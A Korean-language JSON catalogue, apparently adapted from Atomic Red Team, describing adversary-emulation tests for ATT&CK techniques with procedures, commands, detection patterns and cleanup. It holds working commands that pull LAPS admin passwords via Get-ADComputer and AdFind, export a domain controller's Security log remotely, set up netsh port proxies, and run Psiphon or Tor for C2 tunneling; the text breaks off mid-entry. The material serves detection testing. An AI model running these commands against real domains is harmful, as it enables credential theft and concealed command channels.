        "도메인 컨트롤러에 대한 WMI 원격 실행 권한이 있어야 한다.",
        "원격 DC에서 wevtutil 실행 및 보안 로그 Export가 허용되어야 한다.",
        "방화벽이 WMI(DCOM/RPC) 및 파일 공유(445/tcp)를 허용해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\ntlmusers.evtx (도메인 컨트롤러)",
            "description": "보안 로그에서 EventID 4776(NTLM 인증 시도)만 추출한 EVTX 파일"
          }
        ],
        "files_read": [
          {
            "path": "Security 로그(도메인 컨트롤러)",
            "description": "원본 보안 이벤트 로그에서 NTLM 인증 이벤트를 필터링하여 Export"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "wmic.exe",
            "description": "원격 도메인 컨트롤러에서 wevtutil 프로세스를 생성하기 위해 사용되는 WMI 클라이언트",
            "commandline_pattern": "wmic.exe /node:* process call create 'wevtutil epl Security C:\\ntlmusers.evtx*"
          },
          {
            "name": "wevtutil.exe",
            "description": "도메인 컨트롤러에서 보안 로그를 내보내는 이벤트 로그 유틸리티",
            "commandline_pattern": "wevtutil epl Security C:\\ntlmusers.evtx*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 WMI(DCOM/RPC) 엔드포인트",
            "description": "wmic /node 실행 시 발생하는 WMI 원격 호출"
          },
          {
            "destination": "\\\\$IpAddress\\c$",
            "description": "cleanup 단계에서 ntlmusers.evtx 파일 삭제를 위한 원격 파일 공유 액세스"
          }
        ]
      },
      "cleanup": [
        "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx 명령으로 도메인 컨트롤러의 EVTX 파일을 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "b8a563d4-a836-4993-a74e-0a19b8481bfe"
      }
    },
    {
      "test_id": "T1087.002-18",
      "name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties",
      "platforms": ["windows"],
      "summary": "Get-ADComputer #{hostname} -Properties * 명령을 이용해 특정 컴퓨터 객체의 모든 속성을 조회하고, 그 중 LAPS 관련 속성(ms-mcs-AdmPwd, ms-mcs-AdmPwdExpirationTime)을 포함한 전체 정보를 가져온다.",
      "procedure": [
        "PowerShell ActiveDirectory 모듈이 설치되어 있는지 확인한다.",
        "도메인 환경에서 PowerShell을 실행한다.",
        "Get-ADComputer #{hostname} -Properties * 명령을 실행한다.",
        "출력된 속성 목록에서 LAPS 관련 속성과 기타 민감 정보(설명, OS, 마지막 로그온 등)를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADComputer #{hostname} -Properties *"
        }
      ],
      "prerequisites": [
        "LAPS가 구성된 도메인 환경이어야 하며, 해당 컴퓨터 객체에 LAPS 속성이 저장되어 있어야 한다.",
        "Get-ADComputer를 실행할 수 있는 권한과 도메인 컨트롤러에 대한 LDAP/AD 접근 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Get-ADComputer를 사용해 특정 컴퓨터의 모든 AD 속성을 조회하는 프로세스",
            "commandline_pattern": "Get-ADComputer * -Properties *"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러 LDAP/LDAPS",
            "description": "컴퓨터 객체 속성 조회를 위한 LDAP 쿼리"
          }
        ]
      },
      "cleanup": [
        "화면 출력만 존재하며, 필요시 명령 히스토리를 삭제할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "394012d9-2164-4d4f-b9e5-acf30ba933fe"
      }
    },
    {
      "test_id": "T1087.002-19",
      "name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property",
      "platforms": ["windows"],
      "summary": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 사용해 LAPS 로컬 관리자 비밀번호와 만료 시간을 직접 조회한다. 이는 명백한 자격 증명 수집 행위를 시뮬레이션한다.",
      "procedure": [
        "도메인 환경에서 PowerShell을 실행한다.",
        "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 실행한다.",
        "출력 결과에서 LAPS가 관리하는 로컬 관리자 비밀번호와 만료 시간을 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime"
        }
      ],
      "prerequisites": [
        "LAPS 속성에 접근할 수 있는 AD 권한(일반적으로 제한된 그룹만 허용)이 필요하다.",
        "ActiveDirectory 모듈이 설치되어 있고, 도메인 컨트롤러와 통신할 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "LAPS 관련 속성(ms-Mcs-AdmPwd 등)을 직접 조회하는 PowerShell 프로세스",
            "commandline_pattern": "Get-ADComputer * -Properties ms-Mcs-AdmPwd*"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러",
            "description": "LAPS 속성 조회를 위한 LDAP/LDAPS 트래픽"
          }
        ]
      },
      "cleanup": [
        "로그에 남은 명령 히스토리와 콘솔 스크롤을 정리하는 것 외에 별도 클린업은 없다."
      ],
      "metadata": {
        "atomic_source_id": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443"
      }
    },
    {
      "test_id": "T1087.002-20",
      "name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope",
      "platforms": ["windows"],
      "summary": "Get-ADComputer -SearchScope subtree -filter \"name -like '*'\" -Properties * 명령으로 도메인 하위의 모든 컴퓨터 객체를 검색하고, 각 객체의 모든 속성(포함 LAPS 속성)을 일괄 열거한다.",
      "procedure": [
        "도메인 환경에서 PowerShell을 실행한다.",
        "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties * 명령을 실행한다.",
        "결과 목록에서 각 컴퓨터 객체의 LAPS 속성 및 기타 보안 관련 속성을 검토한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *"
        }
      ],
      "prerequisites": [
        "ActiveDirectory 모듈이 설치되어 있어야 하며, 도메인 전체에 대해 컴퓨터 객체를 열거할 수 있는 권한이 필요하다.",
        "도메인 컨트롤러와 LDAP/LDAPS 통신이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "도메인 전체 컴퓨터 객체 및 그 속성을 subtree 범위로 열거하는 PowerShell 프로세스",
            "commandline_pattern": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *"
          }
        ],
        "network": [
          {
            "destination": "도메인 컨트롤러",
            "description": "도메인 전체 컴퓨터 객체 열거를 위한 LDAP 쿼리"
          }
        ]
      },
      "cleanup": [
        "대량 출력만 생기므로, 필요시 콘솔과 로그를 정리할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5"
      }
    },
    {
      "test_id": "T1087.002-21",
      "name": "Suspicious LAPS Attributes Query with adfind all properties",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 도메인의 모든 컴퓨터 객체에 대해 전체 속성(*)을 열거하고, 그 안에 포함된 LAPS 관련 속성(ms-mcs-AdmPwd 등)을 함께 수집한다.",
      "procedure": [
        "ExternalPayloads 디렉터리에 AdFind.exe가 존재하는지 확인한다.",
        "PowerShell에서 AdFind.exe #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" * 명령을 실행한다.",
        "출력에서 각 컴퓨터 객체의 LAPS 속성을 포함한 전체 AD 속성을 분석한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *"
        }
      ],
      "prerequisites": [
        "AdFind.exe가 ExternalPayloads에 존재해야 하며, 없을 경우 사전에 다운로드되어야 한다.",
        "도메인 컨트롤러에 대한 LDAP 쿼리 권한과 네트워크 접근이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "AD 컴퓨터 객체 및 LAPS 속성 열거에 사용되는 AdFind 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "objectclass=computer 필터로 모든 컴퓨터 객체 및 전체 속성을 열거하는 프로세스",
            "commandline_pattern": "AdFind.exe *objectclass=computer* *"
          }
        ],
        "network": [
          {
            "destination": "#{domain}",
            "description": "AdFind.exe를 통한 LDAP/LDAPS 쿼리 트래픽"
          }
        ]
      },
      "cleanup": [
        "필요 없을 경우 AdFind.exe와 결과 파일을 삭제해 정찰 흔적을 줄일 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "abf00f6c-9983-4d9a-afbc-6b1c6c6448e1"
      }
    },
    {
      "test_id": "T1087.002-22",
      "name": "Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd",
      "platforms": ["windows"],
      "summary": "AdFind.exe를 사용해 도메인의 컴퓨터 객체에 대해 ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 속성만 선택적으로 조회한다. 이는 LAPS 로컬 관리자 비밀번호를 노리는 직접적인 자격 증명 수집 기법을 재현한다.",
      "procedure": [
        "ExternalPayloads 디렉터리에 AdFind.exe가 존재하는지 확인한다.",
        "PowerShell에서 AdFind.exe #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime 명령을 실행한다.",
        "출력 결과에서 각 컴퓨터의 LAPS 비밀번호와 만료 시간을 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime"
        }
      ],
      "prerequisites": [
        "LAPS 속성에 접근할 수 있는 도메인 계정 권한이 필요하다.",
        "AdFind.exe가 설치되어 있어야 하며 도메인 컨트롤러에 대한 LDAP 쿼리가 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe",
            "description": "LAPS 속성 쿼리에 사용되는 AdFind 도구"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "AdFind.exe",
            "description": "AD 컴퓨터 객체의 LAPS 속성을 직접 조회하는 프로세스",
            "commandline_pattern": "AdFind.exe *ms-Mcs-AdmPwd*"
          }
        ],
        "network": [
          {
            "destination": "#{domain}",
            "description": "AdFind.exe를 통한 LAPS 속성 LDAP 쿼리"
          }
        ]
      },
      "cleanup": [
        "자격 증명 유출 위험을 줄이기 위해 AdFind 출력 결과를 저장한 파일이 있다면 즉시 삭제해야 한다."
      ],
      "metadata": {
        "atomic_source_id": "51a98f96-0269-4e09-a10f-e307779a8b05"
      }
    }
  ]
},
{
  "technique_id": "T1090.001",
  "technique_name": "Proxy: Internal Proxy",
  "tactic": "Command and Control",
  "description": "이 ATT&CK 기법은 공격자가 내부 시스템의 트래픽 경로를 조작해 프록시/포트포워딩을 구성하는 행위를 의미한다. 로컬 호스트나 중간 장비를 중계 지점으로 사용해 C2 트래픽을 숨기거나, 직접 접근이 불가능한 내부 자원에 우회 접근한다. Windows에서는 netsh portproxy, 레지스트리 설정 등을 통해 투명 프록시/포트 포워딩 구성이 자주 활용된다.",
  "tests": [
    {
      "test_id": "T1090.001-1",
      "name": "Windows netsh portproxy registry-based internal proxy",
      "platforms": ["windows"],
      "summary": "netsh interface portproxy를 사용해 v4tov4 포트 프록시를 생성하는 시나리오를 시뮬레이션한다. 지정된 listenport로 들어오는 연결을 connectaddress:connectport로 투명하게 전달하여, 내부에서 프록시/포트포워더 역할을 수행하게 된다. 이 설정은 레지스트리 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4에 저장되며, netsh interface portproxy show all 명령으로 확인할 수 있다.",
      "procedure": [
        "관리자 권한 PowerShell 또는 cmd.exe 세션을 연다.",
        "테스트에 사용할 대상 주소(connectaddress), 연결 포트(connectport), 수신 포트(listenport)를 결정한다(기본값: 127.0.0.1:1337 → 127.0.0.1:1337).",
        "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress} 명령을 실행해 v4tov4 포트 프록시를 생성한다.",
        "netsh interface portproxy show all 명령으로 프록시 항목이 정상적으로 추가되었는지 확인한다.",
        "동일 호스트 혹은 네트워크 상에서 listenport로 접속해, 실제 트래픽이 connectaddress:connectport로 전달되는지 검증할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}"
        }
      ],
      "prerequisites": [
        "명령은 관리자 권한(고권한 PowerShell 또는 관리자 cmd)으로 실행되어야 한다.",
        "Windows 방화벽 또는 기타 네트워크 필터링 규칙이 listenport 및 connectport에 대한 트래픽을 허용해야 한다.",
        "대상 connectaddress가 로컬 또는 네트워크 상에서 접근 가능한 상태여야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4",
            "description": "netsh interface portproxy 설정을 저장하는 레지스트리 키(v4tov4 포트 프록시 엔트리 포함)"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "관리자 권한으로 netsh interface portproxy 명령을 실행하는 PowerShell 세션",
            "commandline_pattern": "netsh interface portproxy add v4tov4*"
          },
          {
            "name": "netsh.exe",
            "description": "v4tov4 포트 프록시 엔트리를 추가/삭제하는 Windows 네트워크 셸 유틸리티",
            "commandline_pattern": "netsh interface portproxy add v4tov4 listenport=* connectport=* connectaddress=*"
          }
        ],
        "network": [
          {
            "destination": "listenport(로컬) → connectaddress:connectport",
            "description": "구성된 v4tov4 포트 프록시를 통해 수신 포트에서 대상 주소/포트로 리다이렉트되는 내부 트래픽"
          }
        ]
      },
      "cleanup": [
        "netsh interface portproxy delete v4tov4 listenport=#{listenport} 명령을 실행하여 해당 listenport에 대한 포트 프록시 엔트리를 제거한다.",
        "필요시 netsh interface portproxy show all 명령으로 삭제 여부를 재확인한다.",
        "테스트 동안 사용한 커스텀 포트에 대한 방화벽 허용 규칙이 있다면 함께 제거하여 환경을 초기 상태로 되돌린다."
      ],
      "metadata": {
        "atomic_source_id": "b8223ea9-4be2-44a6-b50a-9657a3d4e72a"
      }
    }
  ]
},
{
  "technique_id": "T1090.003",
  "technique_name": "Proxy: Multi-hop Proxy",
  "tactic": "Command and Control",
  "description": "이 ATT&CK 기법은 Psiphon, Tor와 같은 도구를 활용해 여러 단계의 프록시/중계 노드를 거쳐 C2 트래픽을 우회·은닉하는 행위를 의미한다. 단일 프록시가 아닌 다단계(멀티홉) 라우팅을 통해 출발지와 목적지 사이의 연관성을 흐리고, 검열·차단 정책을 우회하거나 탐지를 어렵게 만든다. 일반적으로 상용/오픈소스 프록시·VPN·Tor 클라이언트 실행과 레지스트리 기반 프록시 설정 변경, 비정상적인 암호화 트래픽 패턴 등으로 관찰될 수 있다.",
  "tests": [
    {
      "test_id": "T1090.003-1",
      "name": "Psiphon multi-hop proxy tunneling (Windows)",
      "platforms": ["windows"],
      "summary": "Psiphon 3 클라이언트를 실행해 VPN/SSH/HTTP 프록시 기반 우회 연결을 수립하는 멀티홉 프록시 시나리오를 시뮬레이션한다. 실행 전 현재 사용자의 인터넷 프록시 설정을 백업하고, Psiphon.bat을 통해 psiphon3.exe를 구동한 뒤 종료한다. 테스트가 끝나면 프록시 설정을 백업값으로 복원한다.",
      "procedure": [
        "현재 사용자의 인터넷 프록시 설정(HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer)을 읽어 $env:Temp\\proxy-backup.txt 파일로 백업한다.",
        "Psiphon 클라이언트(psiphon3.exe)가 PathToAtomicsFolder\\..\\ExternalPayloads 경로에 존재하는지 확인하고, 없을 경우 인터넷에서 다운로드해 저장한다.",
        "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat 배치 파일이 존재하는지 확인하고, 없으면 Atomic Red Team GitHub에서 받아온 뒤 src 디렉터리에 저장한다.",
        "PowerShell에서 Psiphon.bat를 실행하여 Psiphon 3 클라이언트를 구동하고, VPN/SSH/HTTP 프록시 연결을 수립한다.",
        "Psiphon 실행 중에는 브라우저 등 클라이언트 트래픽이 Psiphon이 설정한 프록시/터널을 통해 우회 전송될 수 있다.",
        "테스트 종료 시 proxy-backup.txt에 저장된 값을 다시 ProxyServer 레지스트리 키에 써넣어 원래 프록시 구성을 복원한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\""
        }
      ],
      "prerequisites": [
        "현재 사용자 컨텍스트에서 HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer 레지스트리 키를 읽을 수 있어야 한다.",
        "백업 파일 $env:Temp\\proxy-backup.txt가 존재하지 않는 경우, get_prereq 단계에서 ProxyServer 값을 읽어 해당 경로에 저장할 수 있어야 한다.",
        "Psiphon 실행 파일(psiphon3.exe)이 PathToAtomicsFolder\\..\\ExternalPayloads 경로에 존재하거나, 인터넷에 접속해 공식 URL에서 다운로드할 수 있어야 한다.",
        "Psiphon.bat 배치 파일이 PathToAtomicsFolder\\T1090.003\\src 위치에 존재하거나, Atomic Red Team GitHub에서 다운로드 가능해야 한다.",
        "엔드포인트에서 Psiphon이 외부 Psiphon 서버와 통신할 수 있을 정도의 아웃바운드 네트워크 접속 권한이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%TEMP%\\proxy-backup.txt",
            "description": "현재 사용자 Internet Settings ProxyServer 값을 백업한 텍스트 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe",
            "description": "다운로드된 Psiphon 3 실행 파일"
          },
          {
            "path": "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat",
            "description": "Psiphon 클라이언트 실행 및 종료를 자동화하는 배치 스크립트"
          }
        ],
        "files_read": [
          {
            "path": "%TEMP%\\proxy-backup.txt",
            "description": "테스트 종료 시 원래 프록시 설정 복원을 위해 읽는 백업 파일"
          }
        ],
        "registry_keys": [
          {
            "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
            "description": "ProxyServer 값을 통해 브라우저 등 시스템 프록시 설정이 저장된 키; Psiphon 실행 시 값이 변경될 수 있다."
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Psiphon.bat 스크립트를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "*PathToAtomicsFolder*Psiphon.bat*"
          },
          {
            "name": "cmd.exe",
            "description": "배치 파일 내부에서 호출될 수 있는 명령 프롬프트 프로세스",
            "commandline_pattern": "*/c *Psiphon*"
          },
          {
            "name": "psiphon3.exe",
            "description": "VPN/SSH/HTTP 멀티홉 프록시를 수립하는 Psiphon 클라이언트 프로세스",
            "commandline_pattern": "*psiphon3.exe*"
          }
        ],
        "network": [
          {
            "destination": "Psiphon 인프라(다수의 원격 서버, 가변 포트 및 프로토콜)",
            "description": "Psiphon 클라이언트가 VPN/SSH/HTTP 터널을 설정하기 위해 수립하는 암호화된 아웃바운드 연결"
          }
        ]
      },
      "cleanup": [
        "cleanup 단계에서 $env:Temp\\proxy-backup.txt를 읽어 HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer 값을 원래대로 되돌린다.",
        "Psiphon 클라이언트(psiphon3.exe)가 여전히 실행 중인 경우 작업 관리자 또는 taskkill/Stop-Process 등을 사용해 프로세스를 종료한다.",
        "테스트 환경을 완전히 원복하려면, PathToAtomicsFolder\\..\\ExternalPayloads\\psiphon3.exe 및 관련 Psiphon.bat 파일을 삭제하는 방안을 검토할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "14d55ca0-920e-4b44-8425-37eedd72b173"
      }
    },
    {
      "test_id": "T1090.003-2",
      "name": "Tor proxy service usage (Windows)",
      "platforms": ["windows"],
      "summary": "tor.exe를 직접 실행해 Tor 프록시 서비스를 띄우는 멀티홉 프록시 시나리오를 시뮬레이션한다. 테스트는 외부에서 내려받은 tor.exe를 백그라운드에서 구동하고 약 60초 동안 실행한 후, tor 프로세스를 종료한다. 이 동안 로컬 SOCKS/HTTP 프록시를 통해 트래픽이 Tor 네트워크로 라우팅될 수 있다.",
      "procedure": [
        "Tor 실행 파일(tor.exe)의 경로를 입력 인자 TorExe(기본: PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe)로 지정한다.",
        "지정된 TorExe 경로에 파일이 존재하는지 확인하고, 없으면 get_prereq 단계에서 tor-win32-0.4.6.9.zip 아카이브를 다운로드한다.",
        "다운로드한 tor.zip을 PathToAtomicsFolder\\..\\ExternalPayloads\\tor 디렉터리로 풀어 tor.exe를 생성한다.",
        "PowerShell에서 invoke-expression을 사용해 새로운 powershell 프로세스를 시작하고, 그 안에서 cmd /c \"tor.exe\" 명령을 실행해 tor 프록시 서비스를 구동한다.",
        "Tor 프로세스가 기동되면, 로컬 호스트의 SOCKS/프록시 포트를 통해 트래픽이 다중 홉을 거쳐 Tor 네트워크를 통해 라우팅될 수 있다.",
        "스크립트는 60초간 대기(sleep -s 60)한 뒤 stop-process -name \"tor\"를 호출하여 tor.exe 프로세스를 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"#{TorExe}\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null"
        }
      ],
      "prerequisites": [
        "테스트 전에 TorExe 인자에 지정된 경로에 tor.exe가 존재해야 하며, 없을 경우 인터넷에 접속해 tor-win32-0.4.6.9.zip를 다운로드하고 압축을 해제할 수 있어야 한다.",
        "PowerShell에서 Invoke-WebRequest, Expand-Archive 명령을 사용할 수 있어야 하며, 해당 경로에 쓰기 권한이 필요하다.",
        "엔드포인트 방화벽/프록시 설정이 Tor 네트워크로의 아웃바운드 접속을 전면 차단하지 않아야 한다(일부 환경에서는 정책상 차단될 수 있음).",
        "테스트는 기본적으로 표준 사용자 권한으로 실행 가능하지만, 보안 제품이 tor.exe 실행을 차단할 수 있으므로 예외 처리 또는 테스트 전 환경 검토가 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip",
            "description": "Tor 실행 파일과 관련 바이너리를 포함한 다운로드된 ZIP 아카이브"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe",
            "description": "압축 해제 후 생성된 Tor 프록시 서비스 실행 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-WebRequest, Expand-Archive 및 tor.exe 실행을 담당하는 PowerShell 프로세스",
            "commandline_pattern": "*cmd /c start powershell -Command {cmd /c*tor.exe*}"
          },
          {
            "name": "cmd.exe",
            "description": "PowerShell에서 호출되는 중간 실행 셸로, tor.exe를 실제로 실행한다.",
            "commandline_pattern": "*/c *tor.exe*"
          },
          {
            "name": "tor.exe",
            "description": "Tor 네트워크에 접속해 멀티홉 프록시/온ion 라우팅 기능을 제공하는 프로세스",
            "commandline_pattern": "*\\Tor\\tor.exe*"
          }
        ],
        "network": [
          {
            "destination": "Tor 네트워크 노드(가드 노드, 중간 노드, 종료 노드 등)",
            "description": "tor.exe가 수립하는 암호화된 아웃바운드 연결(TCP 9001, 443 등 다양한 포트)로, 다중 홉 프록시 경로를 통해 C2 또는 일반 트래픽을 우회 전송할 수 있다."
          }
        ]
      },
      "cleanup": [
        "테스트 스크립트에서 stop-process -name \"tor\"를 호출해 tor.exe 프로세스를 종료한다.",
        "Tor 프로세스가 남아 있는 경우 작업 관리자나 추가 stop-process/taskkill 명령으로 강제 종료한다.",
        "테스트 환경을 정리하려면 PathToAtomicsFolder\\..\\ExternalPayloads\\tor.zip 및 tor 디렉터리 전체를 삭제해 Tor 바이너리를 제거할 수 있다.",
        "보안 관점에서 Tor 사용 여부를 모니터링하는 환경이라면, 테스트 수행 사실과 타임스탬프를 별도 로그로 남겨 오탐·혼선을 줄인다."
      ],
      "metadata": {
        "atomic_source_id": "7b9d85e5-c4ce-4434-8060-d3de83595e69"
      }
    }
  ]
},
{
  "technique_id": "T1091",
  "technique_name": "Replication Through Removable Media",
  "tactic": "Lateral Movement",
  "description": "이 ATT&CK 기법은 악성코드가 USB 등 이동식 저장매체를 통해 스스로 복제·전파되는 행위를 의미한다. 공격자는 감염된 호스트에서 연결된 모든 이동식 드라이브에 페이로드를 복사하거나 오토런/롱컷 기법을 추가해 다른 시스템으로 확산을 시도한다. 이 과정에서 다수의 이동식 디스크에 동일한 파일명이 반복적으로 생성되는 패턴이 관찰될 수 있다.",
  "tests": [
    {
      "test_id": "T1091-1",
      "name": "USB Malware Spread Simulation (Windows)",
      "platforms": ["windows"],
      "summary": "WMI를 사용해 시스템에 연결된 모든 이동식(USB) 드라이브를 열거한 뒤, 각 드라이브 루트에 테스트 파일을 생성하여 악성코드의 USB 복제 행위를 시뮬레이션한다. 실제 악성 페이로드 대신 T1091Test1.txt라는 파일을 생성해 ‘복제 흔적’만 남긴다. 클린업 단계에서는 동일한 파일을 다시 찾아 제거한다.",
      "procedure": [
        "PowerShell 세션을 연 뒤, Win32_LogicalDisk 클래스에서 drivetype=2(이동식 디스크)인 논리 드라이브들을 조회한다.",
        "Get-WmiObject -Class Win32_LogicalDisk -Filter \"drivetype=2\" 명령으로 이동식 드라이브 목록을 가져와 각 DeviceID(예: E:, F:)를 추출한다.",
        "ForEach 루프를 사용해 발견된 각 드라이브에 대해 \"Removable Drive Found:\" 메시지를 출력하며 드라이브 문자를 기록한다.",
        "New-Item -Path <Drive>\\T1091Test1.txt -ItemType file -Force 명령을 사용하여 각 이동식 드라이브 루트에 T1091Test1.txt 파일을 생성하고, 파일 내용에 시뮬레이션임을 나타내는 문자열을 기록한다.",
        "DFIR 관점에서는 여러 이동식 드라이브에 동일한 이름/내용의 텍스트 파일이 동시에 생성된 상태를 통해 USB 기반 복제 시나리오를 재현·분석할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\n  write-host \"Removable Drive Found:\" $Drive\n  New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}"
        }
      ],
      "prerequisites": [
        "테스트 머신에 최소 1개 이상의 이동식 디스크(USB 메모리 등)가 연결되어 있어야 한다.",
        "실행 계정이 해당 이동식 드라이브 루트에 파일을 생성할 수 있는 쓰기 권한을 보유해야 한다.",
        "PowerShell에서 Get-WmiObject cmdlet을 사용할 수 있어야 하며, WMI 쿼리가 차단되지 않은 환경이어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "?:\\T1091Test1.txt",
            "description": "각 이동식 드라이브 루트에 생성되는 테스트 파일(실제 악성코드 대신 복제 시뮬레이션용 텍스트 파일)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "WMI를 통해 이동식 디스크를 열거하고 각 드라이브에 파일을 생성하는 PowerShell 프로세스",
            "commandline_pattern": "*Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\"*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "동일한 WMI 쿼리(Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\")로 현재 연결된 이동식 드라이브 목록을 다시 가져온다.",
        "각 드라이브에 대해 Remove-Item -Path <Drive>\\T1091Test1.txt -Force -ErrorAction Ignore 명령을 실행하여 생성했던 테스트 파일을 삭제한다.",
        "삭제 후 파일이 제거되었는지 수동으로 드라이브를 열어 확인하거나, DFIR 실험 목적이라면 삭제 전후 타임라인/아티팩트를 수집해 비교 분석한다."
      ],
      "metadata": {
        "atomic_source_id": "d44b7297-622c-4be8-ad88-ec40d7563c75"
      }
    }
  ]
},
{
  "technique_id": "T1095",
  "technique_name": "Non-Application Layer Protocol",
  "tactic": "Command and Control",
  "description": "이 ATT&CK 기법은 HTTP/HTTPS와 같은 일반 애플리케이션 계층이 아닌, ICMP나 임의 TCP/UDP 포트 등의 하위 프로토콜을 이용해 C2 채널을 구성하는 행위를 의미한다. 공격자는 보안 장비가 잘 모니터링하지 않는 프로토콜 또는 포트를 활용해 명령 전송과 데이터 유출을 수행한다. 이 과정에서 비정상적인 ICMP 트래픽, 비표준 포트로의 지속적인 세션 등으로 탐지 단서를 남길 수 있다.",
  "tests": [
    {
      "test_id": "T1095-1",
      "name": "ICMP C2 using Nishang Invoke-PowerShellIcmp",
      "platforms": ["windows"],
